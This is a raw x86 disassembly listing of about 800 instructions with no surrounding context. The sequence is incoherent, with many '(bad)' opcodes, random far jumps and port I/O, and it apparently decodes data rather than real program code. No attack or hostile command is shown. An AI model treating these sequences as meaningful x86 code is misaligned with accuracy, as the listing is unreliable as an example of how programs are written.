  403fdc:	inc    DWORD PTR [eax-0x3c]
  403fdf:	pop    esi
  403fe0:	or     al,0x5a
  403fe2:	aad    0x6a
  403fe4:	out    0x83,al
  403fe6:	add    eax,0x49f19ac
  403feb:	test   eax,0x69f7b244
  403ff0:	aaa    
  403ff1:	test   eax,0xe8ac2f06
  403ff6:	shl    edi,0xdc
  403ff9:	repz test al,0xac
  403ffc:	mov    ebx,esi
  403ffe:	shl    DWORD PTR [ebp+0x78],cl
  404001:	(bad)
  404004:	outs   dx,DWORD PTR ds:[esi]
  404005:	pop    ebp
  404006:	cmp    eax,0x4c469df4
  40400b:	loope  0x403fbd
  40400d:	imul   edi,edi,0xffffffa2
  404010:	mov    eax,ds:0x70
  404015:	add    BYTE PTR [eax],al
  404017:	(bad)  
  404018:	jne    0x40402c
  40401a:	xor    DWORD PTR [ecx-0x4fd5bc84],edi
  404020:	out    0xf3,eax
  404022:	push   es
  404023:	fwait
  404024:	scas   al,BYTE PTR es:[edi]
  404025:	loop   0x404042
  404027:	cmp    BYTE PTR [eax-0x9],0x45
  40402b:	aas    
  40402c:	mov    edx,0xdb4e5d06
  404031:	pop    eax
  404032:	jo     0x404071
  404034:	pushf  
  404035:	sub    DWORD PTR [ebx+0x3c],ebp
  404038:	pop    ebp
  404039:	mov    edx,0xcb25fb2a
  40403e:	xor    edx,esi
  404040:	ds pushf 
  404042:	sbb    al,0x19
  404044:	or     BYTE PTR [ebp+0x7],ch
  404047:	add    cl,al
  404049:	popa   
  40404a:	lahf   
  40404b:	xchg   DWORD PTR [ecx-0x4d797b90],eax
  404051:	scas   al,BYTE PTR es:[edi]
  404052:	sar    DWORD PTR [ecx],1
  404054:	fsubr  st,st(7)
  404056:	mov    al,ds:0x2a18bf42
  40405b:	add    eax,DWORD PTR [edx-0x7717c4bf]
  404061:	mov    cl,BYTE PTR [edx*8-0x3a224c8d]
  404068:	pop    edx
  404069:	loop   0x4040ab
  40406b:	pop    ecx
  40406c:	add    ch,BYTE PTR [ebx+0x600b7231]
  404072:	loope  0x4040d2
  404074:	lock test al,0x10
  404077:	pop    esp
  404078:	fxam   
  40407a:	jns    0x40407c
  40407c:	add    BYTE PTR [eax],al
  40407e:	add    BYTE PTR [eax],al
  404080:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404081:	es daa 
  404083:	imul   eax,DWORD PTR [esi+0x739c642f],0x54
  40408a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40408b:	int    0x68
  40408d:	cmp    eax,0xbaf0c8ea
  404092:	adc    edi,DWORD PTR [eax+0x6778d3db]
  404098:	es test al,0xa1
  40409b:	xchg   esi,eax
  40409c:	adc    eax,0x4c03eea1
  4040a1:	pop    esi
  4040a2:	das    
  4040a3:	cmc    
  4040a4:	pop    esi
  4040a5:	ja     0x404123
  4040a7:	and    ch,BYTE PTR [edx-0x74]
  4040aa:	mov    ebp,0x13857153
  4040af:	push   ecx
  4040b0:	sbb    edi,DWORD PTR [eax]
  4040b2:	ficomp DWORD PTR [edi]
  4040b4:	xor    BYTE PTR [ecx+0x31],dl
  4040b7:	out    dx,eax
  4040b8:	sbb    al,0x2a
  4040ba:	js     0x4040ba
  4040bc:	sbb    eax,0x678bb723
  4040c1:	fdivr  st(5),st
  4040c3:	pop    esp
  4040c4:	inc    esp
  4040c5:	cmc    
  4040c6:	adc    al,0xaa
  4040c8:	xor    DWORD PTR [esi],ecx
  4040ca:	push   esp
  4040cb:	mov    ebx,0x950e072a
  4040d0:	inc    esi
  4040d1:	nop
  4040d2:	jl     0x4040a0
  4040d4:	in     eax,dx
  4040d5:	jp     0x40413c
  4040d7:	inc    edi
  4040d8:	mov    DWORD PTR [esi+0x4e],esp
  4040db:	jle    0x4040f5
  4040dd:	ins    DWORD PTR es:[edi],dx
  4040de:	push   edi
  4040df:	mov    cl,0xa1
  4040e1:	lods   al,BYTE PTR ds:[esi]
  4040e2:	sbb    al,dh
  4040e4:	add    BYTE PTR [eax],al
  4040e6:	add    BYTE PTR [eax],al
  4040e8:	add    dl,dh
  4040ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4040eb:	add    DWORD PTR [ebx],esp
  4040ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040ee:	mov    edx,0xd14d622a
  4040f3:	xor    ecx,DWORD PTR [esi+0x7b]
  4040f6:	jmp    FWORD PTR [edx+0x7]
  4040f9:	dec    edx
  4040fa:	adc    al,0x72
  4040fc:	or     al,0xcd
  4040fe:	out    0x58,eax
  404100:	inc    ebp
  404101:	mov    ah,0xec
  404103:	aas    
  404104:	mov    bl,BYTE PTR [ebp+0x23]
  404107:	bswap  ebx
  404109:	push   es
  40410a:	sub    BYTE PTR [esi],dl
  40410c:	or     al,dl
  40410e:	push   esp
  40410f:	cmp    eax,0x243de149
  404114:	xchg   ah,dh
  404116:	aad    0xa3
  404118:	mov    edi,0xd4babcc3
  40411d:	adc    ah,BYTE PTR [ecx-0x55fdf26f]
  404123:	mov    BYTE PTR [edx+0x77],al
  404126:	je     0x4040ef
  404128:	sbb    DWORD PTR [eax-0x2a2f21a1],0x7c
  40412f:	cmc    
  404130:	adc    DWORD PTR [edi-0x5380136b],ebx
  404136:	mov    ebx,0xd69b3621
  40413b:	cmp    ch,bl
  40413d:	call   0xaa2:0x6a1413a9
  404144:	pop    ebx
  404145:	scas   eax,DWORD PTR es:[edi]
  404146:	pop    edi
  404147:	inc    ebp
  404148:	call   0x0:0x5c6b10
  40414f:	add    BYTE PTR [eax],al
  404151:	add    cl,ch
  404153:	in     eax,dx
  404154:	push   0x79
  404156:	sub    BYTE PTR ds:0x40676070,bl
  40415c:	call   0xf331e848
  404161:	(bad)  
  404162:	xor    eax,0xe4d5de27
  404167:	pop    ebp
  404169:	int3   
  40416a:	mov    ds:0x62838705,eax
  40416f:	mov    ah,0x9f
  404171:	call   0xcad0:0xb1b26411
  404178:	test   eax,0x8d2832a8
  40417d:	cmp    esi,ebx
  40417f:	pop    esi
  404180:	xchg   esi,eax
  404181:	and    al,BYTE PTR [eax]
  404183:	dec    ecx
  404184:	mov    ebx,0xa0394109
  404189:	adc    BYTE PTR [esi+0x6b],dh
  40418c:	loope  0x4041ed
  40418e:	xlat   BYTE PTR ds:[ebx]
  40418f:	fwait
  404190:	cli    
  404191:	inc    esi
  404192:	in     al,0xd
  404194:	(bad)  
  404195:	ins    DWORD PTR es:[edi],dx
  404196:	xor    eax,0x6a74cefc
  40419b:	mov    al,ds:0x12abf354
  4041a0:	dec    esi
  4041a1:	jmp    0x6ff9:0xc162c638
  4041a8:	jns    0x404182
  4041aa:	scas   al,BYTE PTR es:[edi]
  4041ab:	in     eax,0x37
  4041ad:	xchg   edi,eax
  4041ae:	outs   dx,DWORD PTR ds:[esi]
  4041af:	push   ebp
  4041b0:	and    ecx,DWORD PTR [esi-0x5af17cc4]
  4041b6:	add    BYTE PTR [eax],al
  4041b8:	add    BYTE PTR [eax],al
  4041ba:	add    ch,ch
  4041bc:	sub    dl,BYTE PTR ds:0x4f7943bc
  4041c2:	jno    0x404146
  4041c4:	mov    DWORD PTR [eax+ebp*2+0x11],edx
  4041c8:	push   ds
  4041c9:	jns    0x40420e
  4041cb:	shl    bh,1
  4041cd:	popa   
  4041ce:	pop    edx
  4041cf:	nop
  4041d0:	add    esi,DWORD PTR [edx]
  4041d2:	sub    eax,0x36234c9d
  4041d7:	pushf  
  4041d8:	xchg   ebp,eax
  4041d9:	rcr    DWORD PTR [edx],1
  4041db:	outs   dx,DWORD PTR ds:[esi]
  4041dc:	sahf   
  4041dd:	push   ds
  4041de:	add    BYTE PTR [esi-0x29],bl
  4041e1:	or     al,0x98
  4041e3:	fst    DWORD PTR [edi]
  4041e5:	cld    
  4041e6:	xor    BYTE PTR [eax],0x79
  4041e9:	sub    al,0xae
  4041eb:	sbb    edi,DWORD PTR [edx-0x4dd4aa1]
  4041f1:	(bad)  
  4041f2:	hlt    
  4041f3:	aad    0x43
  4041f5:	mov    ecx,0x6b5cd4ef
  4041fa:	ret    0xa5f7
  4041fd:	cwde   
  4041fe:	(bad)  
  404200:	mov    cl,0x7e
  404202:	pop    es
  404203:	es jno 0x404277
  404206:	sbb    al,0x7
  404208:	pusha  
  404209:	shl    BYTE PTR [ecx],0x24
  40420c:	lahf   
  40420d:	xchg   ebx,eax
  40420e:	sub    dl,BYTE PTR ds:0xca6b23f6
  404214:	jl     0x40424b
  404216:	jo     0x4041db
  404218:	arpl   WORD PTR [edi],ax
  40421a:	pop    ebp
  40421b:	test   al,0xaa
  40421d:	aam    0x45
  40421f:	add    BYTE PTR [eax],al
  404221:	add    BYTE PTR [eax],al
  404223:	add    BYTE PTR [ecx+0x2eddfae9],dh
  404229:	sub    DWORD PTR [edx],ecx
  40422b:	lds    ecx,FWORD PTR [edi]
  40422d:	lods   eax,DWORD PTR ds:[esi]
  40422e:	push   esi
  40422f:	call   0xf3683010
  404234:	int    0x26
  404236:	mov    esi,0xcf6f92b2
  40423b:	test   eax,0x849da88b
  404240:	mov    al,ds:0xa99f6cf1
  404245:	ret    
  404246:	push   ebx
  404247:	lds    ebp,FWORD PTR [ebx+eax*4-0x7e]
  40424b:	fimul  WORD PTR [ebp-0x4d]
  40424e:	sub    eax,0xebe143c0
  404253:	scas   al,BYTE PTR es:[edi]
  404254:	sub    dl,ch
  404256:	call   0xe249:0x4232e918
  40425d:	sbb    ecx,DWORD PTR [ecx]
  40425f:	sti    
  404260:	push   es
  404261:	inc    ebp
  404262:	mov    al,0xeb
  404264:	adc    ecx,DWORD PTR [esi+0x77]
  404267:	out    0x7b,eax
  404269:	(bad)  
  40426a:	ss push ss
  40426c:	xchg   edi,eax
  40426d:	mov    edi,0x98ba45d5
  404272:	xchg   esp,eax
  404273:	xor    al,0xc1
  404275:	mov    cl,0x53
  404277:	mov    ds:0xd31a6a80,al
  40427c:	jnp    0x4042e1
  40427e:	mov    cl,0x80
  404280:	dec    esi
  404281:	jl     0x4042fb
  404283:	jno    0x4042c2
  404285:	xchg   ebp,eax
  404286:	test   eax,0xd4
  40428b:	add    BYTE PTR [eax],al
  40428d:	(bad)  
  40428f:	iret   
  404290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404291:	mov    cl,0xe4
  404293:	mov    edx,0x61fbd471
  404298:	and    bh,0x12
  40429b:	sub    eax,0xec4a1e16
  4042a0:	out    0x1c,al
  4042a2:	inc    ecx
  4042a3:	mov    edi,0x7e17f034
  4042a8:	inc    ebp
  4042a9:	fld    TBYTE PTR [esi]
  4042ab:	and    DWORD PTR [ecx+0x73],ecx
  4042ae:	mov    ch,0xe8
  4042b0:	pop    ss
  4042b1:	enter  0xa39c,0xeb
  4042b5:	pushf  
  4042b6:	ret    
  4042b7:	push   0xfffffffa
  4042b9:	(bad)  
  4042ba:	retf   0x8c25
  4042bd:	(bad)  
  4042be:	xchg   ecx,eax
  4042bf:	in     al,0x5c
  4042c1:	les    edi,FWORD PTR [eax-0x59]
  4042c4:	scas   al,BYTE PTR es:[edi]
  4042c5:	jmp    0xf2ffa929
  4042ca:	pushw  cs
  4042cc:	(bad)  
  4042cd:	push   eax
  4042ce:	mov    edx,0xd5000f8f
  4042d3:	xchg   esi,eax
  4042d4:	test   BYTE PTR [ebx+0x223dbda8],dh
  4042da:	lahf   
  4042db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042dc:	repnz xchg ebx,eax
  4042de:	pop    esi
  4042df:	jmp    0x404294
  4042e1:	and    al,0x68
  4042e3:	repnz pusha 
  4042e5:	outs   dx,BYTE PTR ds:[esi]
  4042e6:	xchg   esp,eax
  4042e7:	fldenv [ecx]
  4042e9:	(bad)  
  4042ea:	jnp    0x4042ac
  4042ec:	ficomp WORD PTR [edx+0x13]
  4042ef:	inc    edi
  4042f0:	xchg   edi,eax
  4042f1:	add    BYTE PTR [eax],al
  4042f3:	add    BYTE PTR [eax],al
  4042f5:	add    BYTE PTR [ecx-0x1683a204],bh
  4042fb:	fbstp  TBYTE PTR [ebp+esi*1-0x78]
  4042ff:	out    0x6b,al
  404301:	cli    
  404302:	jne    0x40432b
  404304:	and    edi,DWORD PTR [ebx+0x583a207e]
  40430a:	add    al,0x3d
  40430c:	adc    DWORD PTR [ecx],ebx
  40430e:	int    0x51
  404310:	or     BYTE PTR ds:0x3c50781f,al
  404316:	(bad)  
  404317:	mov    cs,WORD PTR [ecx+0x57]
  40431a:	sbb    eax,0x340e626a
  40431f:	gs jnp 0x4042e3
  404322:	shl    DWORD PTR [edx-0x546d7fcc],0x2d
  404329:	push   ebx
  40432a:	inc    eax
  40432b:	into   
  40432c:	push   es
  40432d:	adc    dh,BYTE PTR [ecx-0x47]
  404330:	pop    ds
  404331:	int    0x64
  404333:	push   ecx
  404334:	cwde   
  404335:	test   bl,cl
  404337:	or     DWORD PTR ss:[edi],0xc6aa2197
  40433e:	pop    ebp
  40433f:	sub    dh,BYTE PTR [ebx-0x4141077]
  404345:	dec    eax
  404346:	call   0x9b41282d
  40434b:	in     al,dx
  40434c:	repnz ror BYTE PTR [edx+0x1d],0xe8
  404351:	fstp   DWORD PTR [esi+ecx*2-0x1c42eb4e]
  404358:	test   al,0xd
  40435a:	add    BYTE PTR [eax],al
  40435c:	add    BYTE PTR [eax],al
  40435e:	add    BYTE PTR [esi+0x2f],ch
  404361:	test   BYTE PTR [esi],ah
  404363:	pop    edi
  404364:	jle    0x404305
  404366:	aas    
  404367:	and    al,bl
  404369:	shl    BYTE PTR [eax-0x3f],0xa2
  40436d:	lds    ebp,FWORD PTR [ecx-0x6e]
  404370:	je     0x40435a
  404372:	inc    edx
  404373:	push   ebx
  404374:	(bad)
  404377:	xchg   esp,eax
  404378:	cwde   
  404379:	imul   ebx,esp,0xffffffc5
  40437c:	gs jo  0x404344
  40437f:	out    0xf6,al
  404381:	pop    ebx
  404382:	out    dx,al
  404383:	daa    
  404384:	or     al,0x49
  404386:	neg    DWORD PTR [eax+0x59]
  404389:	pop    es
  40438a:	mov    eax,0xa11c2c89
  40438f:	sub    al,BYTE PTR [eax+0x31]
  404392:	mov    bl,BYTE PTR [ebx+0x4a]
  404395:	sub    dl,BYTE PTR [ebx+0xeb3e9]
  40439b:	push   es
  40439c:	xchg   esi,eax
  40439d:	int3   
  40439e:	add    DWORD PTR [edi-0x1e],ebx
  4043a1:	mov    DWORD PTR [ebx],eax
  4043a3:	push   eax
  4043a4:	mov    WORD PTR [eax+0x2],cs
  4043a7:	std    
  4043a8:	push   esi
  4043a9:	pop    es
  4043aa:	pop    es
  4043ab:	shl    al,cl
  4043ad:	les    eax,FWORD PTR [esi]
  4043af:	sub    ecx,edx
  4043b1:	add    DWORD PTR [esp+esi*1],0xffffffa4
  4043b5:	inc    ecx
  4043b6:	add    eax,0xe1d6321
  4043bb:	out    dx,al
  4043bc:	add    eax,0x77470fde
  4043c1:	cdq    
  4043c2:	or     eax,0x0
  4043c7:	add    BYTE PTR [eax],cl
  4043c9:	sbb    DWORD PTR [ebx+0xc],ebx
  4043cc:	nop
  4043cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043cf:	sbb    bl,BYTE PTR [ecx-0x67276444]
  4043d5:	add    ebx,eax
  4043d7:	popf   
  4043d8:	mov    dh,BYTE PTR [esi]
  4043da:	dec    esi
  4043db:	pop    esp
  4043dc:	mov    edi,ecx
  4043de:	imul   esp,DWORD PTR [esi],0xe4b5d0ac
  4043e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e5:	scas   eax,DWORD PTR es:[edi]
  4043e6:	aas    
  4043e7:	mov    ds:0x6009a29f,al
  4043ec:	xchg   esi,eax
  4043ed:	sub    eax,0x848b2ef3
  4043f2:	sub    eax,0xc7cb8aed
  4043f7:	stos   DWORD PTR es:[edi],eax
  4043f8:	js     0x4043b8
  4043fa:	popa   
  4043fb:	imul   edi,DWORD PTR [ecx-0x2f],0xc8a235b8
  404402:	xor    bh,0xa3
  404405:	addr16 in al,dx
  404407:	mov    al,0xa1
  404409:	jp     0x404441
  40440b:	jae    0x4043ad
  40440d:	cmc    
  40440e:	inc    edx
  40440f:	cmp    al,0x85
  404411:	in     al,dx
  404412:	cld    
  404413:	std    
  404414:	jl     0x404449
  404416:	ja     0x4043d0
  404418:	xchg   BYTE PTR [esi-0x6f],al
  40441b:	jp     0x40449c
  40441d:	test   eax,0xa0884d4c
  404422:	(bad)  
  404423:	mov    cs,WORD PTR [ecx+0x7bc99b7f]
  404429:	push   edx
  40442a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40442b:	or     eax,DWORD PTR [eax]
  40442d:	add    BYTE PTR [eax],al
  40442f:	add    BYTE PTR [eax],al
  404431:	jp     0x4043d0
  404433:	xchg   esp,eax
  404434:	inc    esp
  404435:	outs   dx,DWORD PTR ds:[esi]
  404436:	adc    al,0x71
  404438:	xchg   BYTE PTR [esi-0x65],ah
  40443b:	loopne 0x4043fc
  40443d:	pop    esp
  40443e:	outs   dx,BYTE PTR ds:[esi]
  40443f:	pop    edx
  404440:	add    dl,BYTE PTR [ebp-0x5f]
  404443:	pop    ds
  404444:	pop    esi
  404445:	(bad)  
  404446:	mov    ah,0x29
  404448:	pushf  
  404449:	mov    edi,0x5ac4d1b2
  40444e:	shl    dh,0x5a
  404451:	cwde   
  404452:	mov    esi,0xc3c76863
  404457:	push   esp
  404458:	into   
  404459:	std    
  40445a:	ret    0x1c9d
  40445d:	inc    ebx
  40445e:	rcl    DWORD PTR [edx+0x57c18102],0x9e
  404465:	mov    ebx,0xf97848ce
  40446a:	iret   
  40446b:	imul   esi,edx,0x4c3ece2e
  404471:	gs int3 
  404473:	stos   DWORD PTR es:[edi],eax
  404474:	ss mov dl,0xd1
  404477:	fsubr  st(0),st
  404479:	pop    es
  40447a:	rol    DWORD PTR ds:0xdad3368b,1
  404480:	mov    ah,0x6c
  404482:	ror    DWORD PTR [edi],cl
  404484:	jo     0x40440e
  404486:	enter  0xc9c0,0x4a
  40448a:	retf   0x23a1
  40448d:	cld    
  40448e:	retf   
  40448f:	xchg   esi,eax
  404490:	std    
  404491:	mov    ch,0xca
  404493:	adc    eax,DWORD PTR [edi]
  404495:	add    BYTE PTR [eax],al
  404497:	add    BYTE PTR [eax],al
  404499:	add    BYTE PTR [ecx-0x39],ah
  40449c:	and    al,0x31
  40449e:	and    eax,edi
  4044a0:	ins    DWORD PTR es:[edi],dx
  4044a1:	mov    ebx,0x6542c4e5
  4044a6:	lahf   
  4044a7:	lds    esp,FWORD PTR [edi]
  4044a9:	jbe    0x4044d5
  4044ab:	cmp    eax,0xffffff9f
  4044ae:	push   0x9e4d9983
  4044b3:	or     DWORD PTR [esi-0x47f240d],0xc7e02e0
  4044bd:	aaa    
  4044be:	inc    ecx
  4044bf:	jl     0x4044f6
  4044c1:	mov    ch,0x87
  4044c3:	jle    0x4044ef
  4044c5:	mov    edi,DWORD PTR [ebp+0x58310e7f]
  4044cb:	sub    esi,DWORD PTR [eax+0x1e]
  4044ce:	imul   BYTE PTR [ecx+0x71]
  4044d1:	(bad)  
  4044d2:	jnp    0x40447a
  4044d4:	jae    0x40449e
  4044d6:	mov    cl,0xe5
  4044d8:	jno    0x404527
  4044da:	mov    al,ds:0x8e7a7732
  4044df:	jo     0x404557
  4044e1:	mov    bl,0xf4
  4044e3:	scas   al,BYTE PTR es:[edi]
  4044e4:	je     0x404562
  4044e6:	sbb    ch,ah
  4044e8:	je     0x404523
  4044ea:	cmp    WORD PTR [edx+0x66],sp
  4044ee:	shl    BYTE PTR [ebx+eiz*2+0x47],1
  4044f2:	jmp    0x5ff8:0x1c5061b9
  4044f9:	lds    ebp,FWORD PTR [ebp+0xb2653f]
  4044ff:	add    BYTE PTR [eax],al
  404501:	add    BYTE PTR [eax],al
  404503:	(bad)  
  404504:	jl     0x40456a
  404506:	jmp    0x4044c9
  404508:	ret    
  404509:	data16 hlt 
  40450b:	sub    eax,DWORD PTR [eax]
  40450d:	addr16 loope 0x4044c6
  404510:	inc    ebp
  404511:	ins    BYTE PTR es:[edi],dx
  404512:	out    dx,al
  404513:	mov    al,ds:0x5a8f6d87
  404518:	leave  
  404519:	outs   dx,DWORD PTR ds:[esi]
  40451a:	mov    eax,0x3d6e0acc
  40451f:	fisttp WORD PTR [ebx+0x6b]
  404522:	or     bh,BYTE PTR [ecx-0x72]
  404525:	push   0x43
  404527:	xchg   ebx,eax
  404528:	shr    BYTE PTR [eax+0x6c],1
  40452b:	jne    0x40453f
  40452d:	imul   ecx,ecx,0xd645dd0a
  404533:	sub    al,0x9f
  404535:	inc    edi
  404536:	aaa    
  404537:	xchg   edi,eax
  404538:	popa   
  404539:	inc    ebp
  40453a:	pusha  
  40453b:	and    DWORD PTR [ebx],0xd472d544
  404541:	inc    eax
  404542:	mov    ds:0x4098a4,al
  404547:	cmp    eax,DWORD PTR [esp+edx*2-0x6a15f3b4]
  40454e:	dec    ebp
  40454f:	loope  0x40457a
  404551:	retf   0x646
  404554:	inc    eax
  404555:	or     BYTE PTR [edi+0x1f],al
  404558:	mov    esi,0xd428454e
  40455d:	mov    es,WORD PTR [ebp+edi*4+0x0]
  404561:	ret    0x8a41
  404564:	add    WORD PTR [eax+0x0],ax
  404568:	add    BYTE PTR [eax],al
  40456a:	add    BYTE PTR [eax],al
  40456c:	inc    ebx
  40456d:	push   ss
  40456e:	inc    edi
  40456f:	inc    edx
  404570:	xor    al,0x7c
  404572:	test   DWORD PTR [ebx-0x57],eax
  404575:	xchg   esi,eax
  404576:	call   DWORD PTR [esi+ecx*4-0x50]
  40457a:	cmp    eax,0x7b8a7755
  40457f:	push   edi
  404580:	inc    eax
  404581:	out    0xb8,al
  404583:	push   esi
  404584:	mov    ch,0xef
  404586:	cmc    
  404587:	push   ebx
  404588:	add    bl,BYTE PTR [edx+0x34]
  40458b:	push   edx
  40458c:	retf   
  40458d:	mov    ds:0xcd7c5072,eax
  404592:	mov    al,0x51
  404594:	push   ecx
  404595:	push   es
  404596:	out    dx,eax
  404597:	pop    edx
  404598:	xchg   esi,eax
  404599:	pusha  
  40459a:	cs pop ebx
  40459c:	outs   dx,DWORD PTR ds:[esi]
  40459d:	sbb    ch,BYTE PTR [eax+0x59]
  4045a0:	pop    eax
  4045a1:	je     0x40454d
  4045a3:	pop    eax
  4045a4:	int    0x1e
  4045a6:	in     eax,0x5d
  4045a8:	cli    
  4045a9:	dec    eax
  4045aa:	daa    
  4045ab:	pop    esp
  4045ac:	xor    esi,DWORD PTR [ebx+0x61]
  4045af:	pop    esi
  4045b0:	add    al,0xdd
  4045b2:	mov    eax,ds:0x3ba8395f
  4045b7:	loope  0x404637
  4045b9:	mov    esi,0x3de7e0f9
  4045be:	mov    edi,0x7d53d0e2
  4045c3:	jecxz  0x404555
  4045c5:	mov    ebp,0x70ae3c7f
  4045ca:	(bad)  
  4045cd:	not    DWORD PTR [ecx]
  4045cf:	mov    eax,0x0
  4045d4:	add    BYTE PTR [ebp+0x7479f80e],ch
  4045da:	add    DWORD PTR [edi],esi
  4045dc:	es ja  0x4045b3
  4045df:	in     al,dx
  4045e0:	jecxz  0x404650
  4045e2:	mov    bl,0x88
  4045e4:	mov    ds:0x60beaa64,al
  4045e9:	jge    0x404610
  4045eb:	lods   al,BYTE PTR ds:[esi]
  4045ec:	das    
  4045ed:	js     0x404627
  4045ef:	jb     0x4045de
  4045f1:	imul   edi,DWORD PTR [edi-0x20],0x46b66baa
  4045f8:	imul   edi,DWORD PTR [edx],0x45136279
  4045fe:	dec    esp
  4045ff:	(bad)  
  404601:	cmp    al,0x2b
  404603:	push   ss
  404604:	xchg   edi,eax
  404605:	ss and dh,al
  404608:	push   esp
  404609:	das    
  40460a:	lods   eax,DWORD PTR ds:[esi]
  40460b:	sbb    bl,BYTE PTR [edx]
  40460d:	sub    al,BYTE PTR [eax]
  40460f:	daa    
  404610:	fcomp  DWORD PTR [ebx]
  404612:	inc    edi
  404613:	mov    cl,0x9e
  404615:	sbb    DWORD PTR [esi],edi
  404617:	pop    ebx
  404618:	pop    esp
  404619:	or     BYTE PTR [ecx-0x6c],dl
  40461c:	add    BYTE PTR [ebx],al
  40461e:	inc    esp
  40461f:	mov    es,edx
  404621:	add    ah,bl
  404623:	out    0x83,eax
  404625:	add    dl,bh
  404627:	inc    ecx
  404628:	inc    esi
  404629:	loope  0x40469f
  40462b:	dec    ebp
  40462c:	or     esp,ebx
  40462e:	xlat   BYTE PTR ds:[bx]
  404630:	retf   0xaee5
  404633:	or     DWORD PTR [ebp+0x4fabc5df],0x0
  40463d:	add    dh,al
  40463f:	sub    BYTE PTR [eax+0x78],cl
  404642:	jmp    0xd8fa2862
  404647:	mov    cl,0xf9
  404649:	jp     0x4045ff
  40464b:	xlat   BYTE PTR ds:[ebx]
  40464c:	sub    eax,0x9ad76ea1
  404651:	scas   al,BYTE PTR es:[edi]
  404652:	and    esp,edx
  404654:	imul   eax,DWORD PTR [ebx+eiz*8-0x631d6b2e],0xffffffd4
  40465c:	leave  
  40465d:	cmp    bh,al
  40465f:	push   cs
  404660:	lahf   
  404661:	idiv   edx
  404663:	or     DWORD PTR [eax+0x5109291d],esi
  404669:	retf   
  40466a:	addr16 pop es
  40466c:	data16 jno 0x40462c
  40466f:	pop    es
  404670:	jecxz  0x4046d1
  404672:	repnz add dl,ah
  404675:	mov    ch,0x30
  404677:	add    al,0x1d
  404679:	xor    al,0x6e
  40467b:	push   es
  40467c:	adc    cl,BYTE PTR [edx]
  40467e:	je     0x404684
  404680:	xlat   BYTE PTR ds:[ebx]
  404681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404682:	out    0xf7,al
  404684:	(bad)  
  404685:	(bad)  
  404686:	sbb    al,0xf7
  404688:	call   0xbe39a066
  40468d:	inc    ebx
  40468e:	mov    cl,bh
  404690:	sub    cl,BYTE PTR [ebp-0x41]
  404693:	hlt    
  404694:	pop    ebx
  404695:	out    0x4,eax
  404697:	test   BYTE PTR [ecx+eax*4-0x64a60bbd],0xa1
  40469f:	repnz mov ss,WORD PTR [eax+eax*1+0x0]
  4046a4:	add    BYTE PTR [eax],al
  4046a6:	add    BYTE PTR [ebp-0x3],dl
  4046a9:	aas    
  4046aa:	mov    esi,0x2820fd0f
  4046af:	leave  
  4046b0:	cli    
  4046b1:	adc    eax,0x92fb9b12
  4046b6:	cld    
  4046b7:	push   ebx
  4046b8:	(bad)  
  4046b9:	mov    ds:0xed001616,eax
  4046be:	rcl    al,1
  4046c0:	add    edx,eax
  4046c2:	push   0xffffff92
  4046c4:	add    BYTE PTR [esi],cl
  4046c6:	test   eax,0x769f2215
  4046cb:	neg    DWORD PTR [edi-0x62]
  4046ce:	pop    ss
  4046cf:	dec    esi
  4046d0:	popf   
  4046d1:	pushf  
  4046d2:	add    BYTE PTR [edx+ebx*8+0x17b2759c],bh
  4046d9:	cwde   
  4046da:	sbb    BYTE PTR [eax+0x56],0x99
  4046de:	mov    ebx,0xa49b94e6
  4046e3:	adc    al,0xd2
  4046e5:	cdq    
  4046e6:	mov    cl,0x5b
  4046e8:	cs xchg ecx,eax
  4046ea:	sahf   
  4046eb:	add    DWORD PTR [ecx-0x70],esi
  4046ee:	jg     0x40476f
  4046f0:	test   eax,0xec8d4892
  4046f5:	xchg   edx,eax
  4046f6:	int    0xa2
  4046f8:	daa    
  4046f9:	xchg   esi,eax
  4046fa:	cli    
  4046fb:	mov    BYTE PTR [ecx-0x69],ch
  4046fe:	xor    esi,DWORD PTR [edi+0x4fc95a3]
  404704:	in     eax,0x93
  404706:	mov    ecx,0xe6833a68
  40470b:	add    BYTE PTR [eax],al
  40470d:	add    BYTE PTR [eax],al
  40470f:	add    dl,dl
  404711:	jge    0x404695
  404713:	(bad)  
  404714:	in     al,dx
  404715:	mov    esi,0x11ed080
  40471a:	add    DWORD PTR [ebp+0x11],0xfb328432
  404721:	jae    0x4046a8
  404723:	imul   eax,ebp,0xffffffb6
  404726:	xchg   DWORD PTR [edi+esi*8-0xa],esi
  40472a:	test   DWORD PTR [ecx-0x48],esp
  40472d:	dec    esp
  40472e:	lea    ebp,[esi-0x5e]
  404731:	mov    cl,BYTE PTR [edi+ecx*1+0x388ed05c]
  404738:	cs push cs
  40473a:	(bad)  
  40473b:	mov    ebp,0x8a8a44d7
  404740:	imul   eax,DWORD PTR [ebx-0x132cff75],0xc6bc8717
  40474a:	fild   DWORD PTR [esi-0x5613d9a7]
  404750:	xchg   ax,ax
  404752:	cs test al,0xff
  404755:	mov    eax,0xa2b0aa68
  40475a:	stos   BYTE PTR es:[edi],al
  40475b:	stos   DWORD PTR es:[edi],eax
  40475c:	cmp    eax,0x72aee5ce
  404761:	call   0x60fbf68b
  404766:	popa   
  404767:	lods   eax,DWORD PTR ds:[esi]
  404768:	xchg   esp,eax
  404769:	cld    
  40476a:	mov    ds:0xff3761ac,al
  40476f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404770:	jle    0x404793
  404772:	cmp    eax,0xa6
  404777:	add    BYTE PTR [eax],al
  404779:	xchg   edi,eax
  40477a:	test   eax,0xd3b8a47b
  40477f:	mov    bh,0xa5
  404781:	xor    eax,0xfaa0f8df
  404786:	js     0x4047bc
  404788:	mov    eax,ds:0xa37212c3
  40478d:	in     al,dx
  40478e:	ins    BYTE PTR es:[edi],dx
  40478f:	mov    al,0xa2
  404791:	sub    ecx,ecx
  404793:	retf   0x16b5
  404796:	out    dx,eax
  404797:	or     dh,BYTE PTR [edi+ebp*8-0x5f49b1a4]
  40479e:	add    cl,BYTE PTR [edi+esi*4-0x4d3cced3]
